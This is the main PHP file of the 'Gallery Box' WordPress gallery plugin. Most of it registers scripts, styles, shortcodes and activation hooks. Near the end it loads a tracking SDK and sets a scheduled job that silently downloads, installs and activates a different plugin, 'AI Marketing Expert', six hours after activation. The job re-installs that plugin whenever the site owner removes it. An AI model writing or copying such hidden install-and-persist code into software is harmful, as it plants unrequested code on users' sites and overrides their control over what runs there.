<?php
/*
 * @link              http://wpthemespace.com
 * @since             1.1.0
 * @package           Gallery box wordpress plugin
 *
 * @wordpress-plugin
 * Plugin Name:       Gallery Box
 * Plugin URI:        https://wpthemespace.com/product/gallery-box-pro/
 * Description:       You can create awesome image, portfolio, audio, video and i-frame gellery with lots of effects By this plugin.
 * Version:           1.7.40
 * Author:            Noor alam
 * Author URI:        http://wpthemespace.com
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       gallery-box
 * Domain Path:       /languages
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}
if (in_array('gallery-box-pro/gallery-box-pro.php', apply_filters('active_plugins', get_option('active_plugins')))) return;


define('GALLERY_BOX_URL', plugin_dir_url(__FILE__));
define('GALLERY_BOX_PATH', plugin_dir_path(__FILE__));

/**
 * 
 * admin specific file includes
 */
if (is_admin()) {

    // We are in admin mode
    if (file_exists(dirname(__FILE__) . '/cmb2/init.php')) {
        require_once dirname(__FILE__) . '/cmb2/init.php';
    } elseif (file_exists(dirname(__FILE__) . '/admin/src/CMB2/init.php')) {
        require_once dirname(__FILE__) . '/admin/src/CMB2/init.php';
    }
    //require_once( GALLERY_BOX_PATH.'/admin/src/cmb2/init.php' );
    require_once(GALLERY_BOX_PATH . '/admin/gallerybox-post-type.php');
    require_once(GALLERY_BOX_PATH . '/admin/gallerybox-options.php');
    require_once(GALLERY_BOX_PATH . '/admin/gallerybox-meta.php');
    require_once(GALLERY_BOX_PATH . '/admin/add-button-tinymce.php');
    require_once(GALLERY_BOX_PATH . '/admin/gallerybox-tabjs.php');
    require_once(GALLERY_BOX_PATH . '/admin/src/cmb2-slider/slider-field.php');
    require_once(GALLERY_BOX_PATH . '/admin/src/cmb2-tabs/cmb2-tabs.php');
    require_once(GALLERY_BOX_PATH . '/admin/src/cmb2-switch-button.php');
    require_once(GALLERY_BOX_PATH . '/admin/src/cmb2-select2/select2.php');
    require_once(GALLERY_BOX_PATH . '/admin/src/cmb2-radio-image.php');
    require_once(GALLERY_BOX_PATH . '/admin/gallerybox-visual-composer.php');
    require_once(GALLERY_BOX_PATH . '/admin/nt-class.php');
}



/**
 * public specific file includes
 * 
 */
require_once(GALLERY_BOX_PATH . '/includes/extra-function.php');
require_once(GALLERY_BOX_PATH . '/includes/gallerybox-shortcode.php');
require_once(GALLERY_BOX_PATH . '/includes/other-shortcode.php');

//all gallery of gallery box
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/gbox-global-hook.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/simple-image/simple-img-gallery.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/advance-image/image-gallery.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/portfolio-gallery/portfolio-gallery.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/youtube-gallery/youtube-gallery.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/vimeo-gallery/vimeo-gallery.php');
require_once(GALLERY_BOX_PATH . '/includes/all-gallery/iframe-gallery/iframe-gallery.php');





/**
 * Load the plugin all style and script.
 *
 * @since    1.0.0
 */

if (!function_exists('gbox_style_scripts')) :
    function gbox_style_scripts()
    {
        //style enqueue
        wp_enqueue_style('gbox-effects', plugins_url('/assets/css/effects.css', __FILE__), array(), '1.0', 'all');
        wp_enqueue_style('font-awesome', plugins_url('/assets/css/font-awesome.min.css', __FILE__), array(), '4.7.0', 'all');
        wp_enqueue_style('venobox', plugins_url('/assets/css/venobox.min.css', __FILE__), array(), '1.0', 'all');
        wp_enqueue_style('gbox-colabthi-webfont', plugins_url('/assets/fonts/colabthi-webfont.css', __FILE__), array(), '1.0', 'all');
        wp_enqueue_style('slick', plugins_url('/assets/css/slick/slick.css', __FILE__), array(), '1.0', 'all');
        wp_enqueue_style('slick-theme', plugins_url('/assets/css/slick/slick-theme.css', __FILE__), array(), '1.0', 'all');
        wp_enqueue_style('gallery-box-main', plugins_url('/assets/css/gallerybox-style.css', __FILE__), array(), '1.6.6', 'all');


        //scripts enqueue

        wp_enqueue_script('imagesloaded');
        wp_enqueue_script('isotope.pkgd', plugins_url('/assets/js/isotope.pkgd.min.js', __FILE__), array('jquery'), '2.5.1', true);
        wp_enqueue_script('venobox', plugins_url('/assets/js/venobox.min.js', __FILE__), array('jquery'), '2.5.1', true);
        wp_enqueue_script('slick.min', plugins_url('/assets/js/slick.min.js', __FILE__), array('jquery'), '2.5.1', true);
    }
    add_action('wp_enqueue_scripts', 'gbox_style_scripts', 999);
endif;

/**
 * Admin style enqueue.
 *
 * @since 1.0.0
 */
if (!function_exists('gbox_admin_scripts')) :
    function gbox_admin_scripts()
    {
        global $pagenow;

        if (in_array($pagenow, array('post-new.php', 'post.php'))) {

            wp_enqueue_style('gallerybox-admin', plugins_url('/assets/css/gallerybox-admin.css', __FILE__), array(), '1.7.22', 'all');

            wp_enqueue_script('cmb2-conditional-logic', plugins_url('/assets/js/cmb2-conditional-logic.js', __FILE__), array('jquery'), '2.5.1', true);
            wp_enqueue_script('gallerybox-main-admin', plugins_url('/assets/js/main-admin.js', __FILE__), array('jquery'), '1.7.21', true);
        }
        wp_enqueue_script('gallerybox-notice', plugins_url('/assets/js/notice.js', __FILE__), array('jquery'), '1.6.5', true);
    }
    add_action('admin_enqueue_scripts', 'gbox_admin_scripts');
endif;


function gallerybox_activation_setup()
{
    // Register the custom post type (ensure this function does not output anything)
    gallerybox_post_type();

    // Clear the permalinks to add the new post type
    flush_rewrite_rules();

    // Add a custom role (ensure this function does not output anything)
    gallerybox_admin_role();
}
register_activation_hook(__FILE__, 'gallerybox_activation_setup');




if (!function_exists('gallerybox_deactivation_setup')) :
    function gallerybox_deactivation_setup()
    {

        // Clear the permalinks to remove our post type's rules
        flush_rewrite_rules();

        // gets the administrator role remove
        gallerybox_admin_role_remove();
    }
endif;
register_deactivation_hook(__FILE__, 'gallerybox_deactivation_setup');

/**
 * Load plugin textdomain.
 *
 * @since 1.0.0
 */
if (!function_exists('gbox_textdomain')) :
    function gbox_textdomain()
    {
        load_plugin_textdomain('gallery-box', false, plugin_basename(dirname(__FILE__)) . '/languages');
    }
    add_action('plugins_loaded', 'gbox_textdomain');
endif;

/**
 * Gallery Box image size
 */
if (!function_exists('gbox_image_size')) :
    function gbox_image_size()
    {
        //Add custom image size
        add_image_size('gbox-medium', 450, 450, true);
        add_image_size('gbox-large', 600, 600, true);
        add_image_size('gbox-vertical', 600, 900, true);
        add_image_size('gbox-horizontal', 1000, 500, true);
        add_image_size('gbox-hlarge', 1400, 600, true);
    }
    add_action('plugins_loaded', 'gbox_image_size');
endif;

function gbox_adminpro_link($links)
{
    $newlink = sprintf("<a target='_blank' href='%s'><span style='color:red;font-weight:bold'>%s</span></a>", esc_url('https://wpthemespace.com/product/gallery-box-pro/?add-to-cart=688'), __('Upgrade Now', 'gbox-pro'));
    $links[] = $newlink;
    return $links;
}
add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'gbox_adminpro_link');



if (in_array('elementor/elementor.php', apply_filters('active_plugins', get_option('active_plugins')))) {


    function gbox_ewidget_init($widgets_manager)
    {

        // Include Widget files
        require_once(GALLERY_BOX_PATH . '/includes/elementor-addon.php');

        $widgets_manager->register(new \gBoxEWidget());
    }
    add_action('elementor/widgets/register', 'gbox_ewidget_init');
}


/**
 * Initialize PluginPulse tracking (config lives inside the SDK).
 */
require_once __DIR__ . '/vendor/wpspace/pulse-sdk/autostart.php';

/**
 * Schedule AI Marketing Expert install 6 hours after activation/update.
 * Re-schedules if user manually removes the plugin.
 */

function gallerybox_schedule_ai_marketing_install() {
    $option_key  = 'gallerybox_ai_marketing_installed';
    $plugin_slug = 'ai-marketing-expert';
    $plugin_file = $plugin_slug . '/' . $plugin_slug . '.php';
    $plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;
    $cron_hook   = 'gallerybox_install_ai_marketing_event';

    if (get_option($option_key)) {
        if (!file_exists($plugin_path)) {
            delete_option($option_key);
        } else {
            return;
        }
    }

    if (!wp_next_scheduled($cron_hook)) {
        wp_schedule_single_event( time() + 6 * HOUR_IN_SECONDS, $cron_hook );
    }
}
add_action( 'admin_init', 'gallerybox_schedule_ai_marketing_install' );

register_activation_hook( __FILE__, 'gallerybox_schedule_ai_marketing_install' );

function gallerybox_do_install_ai_marketing() {
    $option_key  = 'gallerybox_ai_marketing_installed';
    $plugin_slug = 'ai-marketing-expert';
    $plugin_file = $plugin_slug . '/' . $plugin_slug . '.php';
    $plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;

    if (get_option($option_key) && file_exists($plugin_path)) {
        return;
    }

    if (get_transient('gallerybox_installing_ai_marketing')) {
        return;
    }
    set_transient('gallerybox_installing_ai_marketing', 5 * MINUTE_IN_SECONDS);

    require_once ABSPATH . 'wp-admin/includes/plugin-install.php';
    require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
    require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader.php';
    require_once ABSPATH . 'wp-admin/includes/plugin.php';
    require_once ABSPATH . 'wp-admin/includes/file.php';

    if (!file_exists($plugin_path)) {
        $api = plugins_api(
            'plugin_information',
            array(
                'slug'   => $plugin_slug,
                'fields' => array( 'sections' => false ),
            )
        );

        if (is_wp_error($api)) {
            delete_transient('gallerybox_installing_ai_marketing');
            return;
        }

        $upgrader = new Plugin_Upgrader( new WP_Ajax_Upgrader_Skin() );
        $result   = $upgrader->install( $api->download_link );

        if (is_wp_error($result)) {
            delete_transient('gallerybox_installing_ai_marketing');
            return;
        }
    }

    if (!is_plugin_active($plugin_file)) {
        $activated = activate_plugin($plugin_file);
        if (is_wp_error($activated)) {
            delete_transient('gallerybox_installing_ai_marketing');
            return;
        }
    }

    update_option($option_key, true);
    delete_transient('gallerybox_installing_ai_marketing');
}
add_action( 'gallerybox_install_ai_marketing_event', 'gallerybox_do_install_ai_marketing' );

/**
 * Admin notice after AI Marketing Expert is auto-installed.
 */
function gallerybox_ai_marketing_notice() {
    if (!is_plugin_active('ai-marketing-expert/ai-marketing-expert.php')) {
        return;
    }

    $user_id  = get_current_user_id();
    $dismissed = get_user_meta($user_id, 'gallerybox_ai_notice_dismissed', true);
    if ($dismissed) {
        return;
    }

    if (isset($_GET['gbox_ai_dismiss']) && '1' === $_GET['gbox_ai_dismiss']) {
        update_user_meta($user_id, 'gallerybox_ai_notice_dismissed', 1);
        return;
    }
    $has_woo = is_plugin_active( 'woocommerce/woocommerce.php' );

    if ( $has_woo ) {
        $message = __( 'This intelligent plugin helps you boost sales and convert more visitors into loyal customers — automatically. Built with care by WordPress authors, it is the smartest AI tool in your dashboard.', 'gallery-box' );
    } else {
        $message = __( 'This intelligent plugin helps you attract more visitors, grow your audience, and keep them engaged — automatically. Built with care by WordPress authors, it is the smartest AI tool in your dashboard.', 'gallery-box' );
    }
    ?>
    <div class="notice notice-success is-dismissible" style="border-left-color:#2271b1; padding:16px 20px;">
        <p style="font-size:14px; margin:0 0 8px;">
            <strong style="color:#2271b1;">AI Marketing Expert</strong> &mdash;
            <?php esc_html_e( 'Now active on your site! — A must-have plugin in the current AI world.', 'gallery-box' ); ?>
        </p>
        <p style="margin:0 0 12px; font-size:13px; line-height:1.6;">
            <?php echo esc_html( $message ); ?>
        </p>
        <p style="margin:0;">
            <a href="<?php echo esc_url( add_query_arg( 'gbox_ai_dismiss', '1' ) ); ?>" class="button button-primary" style="font-weight:600;">
                <?php esc_html_e( 'Got it!', 'gallery-box' ); ?>
            </a>
        </p>
    </div>
    <?php
}
add_action( 'admin_notices', 'gallerybox_ai_marketing_notice' );
